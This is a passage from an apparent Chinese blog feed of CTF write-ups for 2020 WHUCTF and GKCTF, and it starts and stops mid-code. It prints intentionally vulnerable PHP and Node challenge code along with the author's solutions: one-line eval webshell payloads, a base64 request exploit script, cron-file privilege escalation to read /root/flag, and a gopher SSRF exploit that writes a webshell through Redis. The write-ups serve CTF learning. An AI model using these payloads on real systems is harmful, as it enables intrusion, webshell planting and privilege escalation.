punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment">#  反序列化点</span>      @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p align=\"center\" style=\"font-weight: bold;\">此地无银三百两&lt;/p>"</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"refresh:3;url=view.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Can not delete!"</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"&lt;p align=\"center\" style=\"font-weight: bold;\">此地无银三百两&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$ins</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$ins</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h3>此地无银三百两"</span> <span class="token punctuation">.</span> <span class="token variable">$ins</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dir</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token variable">$ins</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show_file_list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$ins</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show_img</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'delete'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'delete'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$ins</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">delete_img</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$ins</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-2-HappyGame"><a href="#1-2-HappyGame" class="headerlink" title="1.2  HappyGame"></a>1.2  HappyGame</h2><p><strong>考点：</strong>原型链泄露 + 代码审计</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>Node.js 这个反序列化的漏洞到底有多大？ <a href="https://zhuanlan.zhihu.com/p/25257419?columnSlug=FrontendMagazine" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25257419?columnSlug=FrontendMagazine</a></p><p><strong>2、</strong>2019SCUCTF部分题解  <a href="https://www.neddos.tech/?p=172" target="_blank" rel="noopener">https://www.neddos.tech/?p=172</a></p><p><strong>3、</strong>express中request.params取参数问题  <a href="https://www.jianshu.com/p/0eb9edf209f8" target="_blank" rel="noopener">https://www.jianshu.com/p/0eb9edf209f8</a></p><p><strong>4、</strong> Node.js 常见漏洞学习与总结   <a href="https://xz.aliyun.com/t/7184" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184</a></p><p><strong>5、</strong>NodeJS远程代码执行  <a href="https://www.jb51.net/article/91411.htm" target="_blank" rel="noopener">https://www.jb51.net/article/91411.htm</a></p><p><strong>6、</strong>writeup： <a href="https://blog.szfszf.top/article/43/" target="_blank" rel="noopener">https://blog.szfszf.top/article/43/</a></p><p><strong>注意事项：</strong></p><p><strong>1、</strong></p><p><img src="/2020/05/26/2020-whuctf/1.png" alt="token"></p><p>获取首字符不为数字的token， 因为javascript数字开头的变量会导致报错，所以多次尝试让它生成一个以字母开头的就行了，然后将sessionID用新生成的替换，不要漏掉最后的分号。</p><p><strong>2、</strong></p><p><img src="/2020/05/26/2020-whuctf/3.png" alt="getflag"></p><p><strong>3、</strong>本地搭建完成</p><p>在ubuntu下使用Postman，Body处改JSON格式，Headers改Cookie，发送方式为post。</p><p><img src="/2020/05/26/2020-whuctf/4.png" alt="Cookie"></p><p><img src="/2020/05/26/2020-whuctf/2.png" alt="Body"></p><h2 id="1-3-BookShop"><a href="#1-3-BookShop" class="headerlink" title="1.3  BookShop"></a>1.3  BookShop</h2><p><strong>考点：</strong>css注入 + csrf</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>writeup： <a href="https://blog.szfszf.top/article/43/" target="_blank" rel="noopener">https://blog.szfszf.top/article/43/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-GKCTF</title>
      <link href="/2020/05/24/2020-gkctf/"/>
      <url>/2020/05/24/2020-gkctf/</url>
      
        <content type="html"><![CDATA[<h1 id="1-check-in"><a href="#1-check-in" class="headerlink" title="1.  check in"></a>1.  check in</h1><p><strong>考点：</strong>一句话 + 提权</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>writeup:<a href="https://mp.weixin.qq.com/s?__biz=MzIxMTAyMzMzOA==&amp;mid=2247483807&amp;idx=1&amp;sn=a6f8f2a7eacb0bd70eee37394e2371df&amp;chksm=975ae51aa02d6c0c4318d756392c42dec0f3b1272b2d0807b6cc8a961370882b1f30314085e3&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1590332393328&amp;sharer_shareid=c1bc1580fcad51a84dfb5e5c4f403880#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIxMTAyMzMzOA==&amp;mid=2247483807&amp;idx=1&amp;sn=a6f8f2a7eacb0bd70eee37394e2371df&amp;chksm=975ae51aa02d6c0c4318d756392c42dec0f3b1272b2d0807b6cc8a961370882b1f30314085e3&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1590332393328&amp;sharer_shareid=c1bc1580fcad51a84dfb5e5c4f403880#rd</a></p><pre class="line-numbers language-php"><code class="language-php"> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Check_In<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ClassName</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$decode</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'Ginkgo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">decode</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">Eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题踩了很多坑，也学到很多知识，在此详细记录下。</p><p><strong>坑点一：</strong>连蚁剑</p><p>直接利用<code>eval(&quot;eval($_POST[a]);&quot;)</code>就可以连上蚁剑了。</p><pre><code>?Ginkgo=eval($_POST[a]);?Ginkgo=ZXZhbCgkX1BPU1RbJ2EnXSk7http://937d2b97-a7b2-43ac-aab2-bee523949983.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX1BPU1RbJ2EnXSk7</code></pre><p><strong>坑点二：</strong>提权</p><p>Y1ng的一键日穿神器：</p><pre><code>https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass/exploit.php稍作改动：pwn(&quot;echo `/readflag` &gt; /tmp/result.txt&quot;);或者：pwn(&quot;/readflag&quot;);</code></pre><p>在/tmp目录下上传提权脚本后，一定要去改权限，不然提权脚本无法正常执行。</p><p><img src="/2020/05/24/2020-gkctf/1.png" alt="改权限"></p><p><strong>final_exp：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote <span class="token keyword">as</span> qurl <span class="token operator">=</span> <span class="token string">'http://937d2b97-a7b2-43ac-aab2-bee523949983.node3.buuoj.cn/?Ginkgo='</span>payload <span class="token operator">=</span> <span class="token string">'include("/tmp/exp.php");'</span><span class="token comment" spellcheck="true"># payload = 'include("/tmp/phpinfo.php");'</span>final_url <span class="token operator">=</span> url <span class="token operator">+</span> q<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>final_url<span class="token punctuation">)</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>final_url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2-cve版签到"><a href="#2-cve版签到" class="headerlink" title="2.  cve版签到"></a>2.  cve版签到</h1><p>提示：cve-2020-7066 </p><p><strong>考点：</strong>ssrf</p><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7066" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7066</a></p><p><strong>2、</strong><a href="https://www.suse.com/zh-cn/security/cve/CVE-2020-7066/" target="_blank" rel="noopener">https://www.suse.com/zh-cn/security/cve/CVE-2020-7066/</a></p><p>通过<code>%00</code>截断可以让<code>get_headers()</code>请求到错误的主机。</p><h1 id="3-老八小超市儿"><a href="#3-老八小超市儿" class="headerlink" title="3.  老八小超市儿"></a>3.  老八小超市儿</h1><p><strong>考点：</strong>shopxo框架 + 提权</p><p>茫茫多页面，晕。复现成功学到很多知识，好好记录下。</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>渗透测试|shopxo后台全版本获取shell复现  <a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">http://www.nctry.com/1660.html</a></p><p><strong>2、</strong>writeup：<a href="https://www.gem-love.com/ctf/2361.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2361.html</a></p><p><strong>3、</strong>python 保存命令执行结果  <a href="https://www.bbsmax.com/A/LPdo8pGOz3/" target="_blank" rel="noopener">https://www.bbsmax.com/A/LPdo8pGOz3/</a></p><p><strong>坑点一：</strong></p><p>宁信书，不如无书，在下载的主题压缩包放入shell后，只需把里面的default打包上传即可，同时访问路径为public/static/index/default/exp.php。</p><p><strong>坑点二：</strong></p><p>蚁剑连接后，根据提示flag在root目录下，但root目录无权限访问，查看auto.sh</p><pre class="line-numbers language-shell"><code class="language-shell">#!/bin/shwhile true; do (python /var/mail/makeflaghint.py &) && sleep 60; done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看/var/mail/makeflaghint.py，发现其可以写文件到根目录下的flag.hint，而根目录下的文件我们是没有写权限的，猜测python脚本是以root权限执行的，而python文件可写，构造payload。</p><p>或者用ps -ef查看auto.sh为root权限，那么python脚本也是拥有root权限的。</p><p><img src="/2020/05/24/2020-gkctf/2.png" alt="auto.sh"></p><p><strong>payload1：</strong></p><pre><code>f.write(os.popen(&quot;cat /root/flag&quot;).read())os.system()返回的是0,1,不能返回命令执行结果，所以用os.popen()</code></pre><p><strong>payload2：</strong></p><p>扫描root目录：</p><pre class="line-numbers language-python"><code class="language-python">f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"/tmp/pperk"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token keyword">for</span> root<span class="token punctuation">,</span>dirs<span class="token punctuation">,</span>files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>r<span class="token string">"/root"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span>file<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#/root/.bashrc</span><span class="token comment" spellcheck="true">#/root/.profile</span><span class="token comment" spellcheck="true">#/root/flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>g = open(&quot;/root/flag&quot;,&quot;r&quot;)f = open(&quot;/tmp/flag&quot;,&quot;w&quot;)f.write(g.read())</code></pre><h1 id="4-EZ三剑客-EzWeb"><a href="#4-EZ三剑客-EzWeb" class="headerlink" title="4.  EZ三剑客-EzWeb"></a>4.  EZ三剑客-EzWeb</h1><p><strong>考点：</strong>redis + ssrf</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>浅析Redis中SSRF的利用（very important）  <a href="https://byqiyou.github.io/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Reference" target="_blank" rel="noopener">https://byqiyou.github.io/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Reference</a></p><p><strong>2、</strong>writeup：<a href="https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzWeb" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzWeb</a></p><h2 id="4-1-first-step"><a href="#4-1-first-step" class="headerlink" title="4.1  first step"></a><strong>4.1  first step</strong></h2><p>?secret暴露出内网地址，对网段进行扫描，存在提示去扫描端口。</p><p><img src="/2020/05/24/2020-gkctf/3.png" alt="扫描内网网段"></p><p>对上述内网地址进行端口扫描，爆出6379端口，回显内容如下：（redis的报错）</p><pre><code>-ERR wrong number of arguments for &#39;get&#39; command 1</code></pre><h2 id="4-2-next-step"><a href="#4-2-next-step" class="headerlink" title="4.2  next_step"></a><strong>4.2  next_step</strong></h2><p><strong>贴上poc：</strong></p><pre><code>gopher://192.168.163.128:6379/_*1$8flushall*3$3set$11$31&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;*4$6config$3set$3dir$13/var/www/html*4$6config$3set$10dbfilename$9shell.php*1$4save</code></pre><p><strong>exp如下：</strong></p><pre class="line-numbers language-php"><code class="language-php">import urllibprotocol<span class="token operator">=</span>"gopher<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//"</span>ip<span class="token operator">=</span><span class="token string">"173.224.146.11"</span>port<span class="token operator">=</span><span class="token string">"6379"</span>shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?>\n\n"</span>filename<span class="token operator">=</span><span class="token string">"shell.php"</span>path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>passwd<span class="token operator">=</span><span class="token string">""</span>cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>   <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"${IFS}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>   <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>   <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>   <span class="token string">"save"</span>   <span class="token punctuation">]</span><span class="token keyword">if</span> passwd<span class="token punctuation">:</span>  cmd<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH {}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span>def <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token constant">CRLF</span><span class="token operator">=</span><span class="token string">"\r\n"</span>  redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>  cmd<span class="token operator">=</span><span class="token string">""</span>  cmd<span class="token operator">+</span><span class="token operator">=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> x in redis_arr<span class="token punctuation">:</span>    cmd<span class="token operator">+</span><span class="token operator">=</span><span class="token constant">CRLF</span><span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token constant">CRLF</span><span class="token operator">+</span>x<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"${IFS}"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>  cmd<span class="token operator">+</span><span class="token operator">=</span><span class="token constant">CRLF</span>  <span class="token keyword">return</span> cmd<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>  <span class="token keyword">for</span> x in cmd<span class="token punctuation">:</span>    payload <span class="token operator">+</span><span class="token operator">=</span> urllib<span class="token punctuation">.</span><span class="token function">quote</span><span class="token punctuation">(</span><span class="token function">redis_format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload放到输入框直接打，就可以写入一个一句话木马。</p><h2 id="4-3-final-step"><a href="#4-3-final-step" class="headerlink" title="4.3  final_step"></a>4.3  final_step</h2><p><img src="/2020/05/24/2020-gkctf/4.png" alt="final"></p><h1 id="5-EZ三剑客-EzNode"><a href="#5-EZ三剑客-EzNode" class="headerlink" title="5.  EZ三剑客-EzNode"></a>5.  EZ三剑客-EzNode</h1><p><strong>考点：</strong>setTimeout整型溢出 + safer-eval漏洞引起的沙箱逃逸</p><p><strong>参考资料：</strong></p><p><strong>1、</strong> <a href="https://github.com/commenthol/safer-eval/issues/10" target="_blank" rel="noopener">https://github.com/commenthol/safer-eval/issues/10</a> </p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> saferEval <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'safer-eval'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 2019.7/WORKER1 找到一个很棒的库</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 调用express方法实例化对象</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 2020.1/WORKER2 老板说为了后期方便优化</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>path <span class="token operator">===</span> <span class="token string">'/eval'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> delay <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>delay<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Number<span class="token punctuation">.</span><span class="token function">isInteger</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      delay <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>delay<span class="token punctuation">,</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> t <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Timeout!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/eval'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> response <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      response <span class="token operator">=</span> <span class="token function">saferEval</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">)</span><span 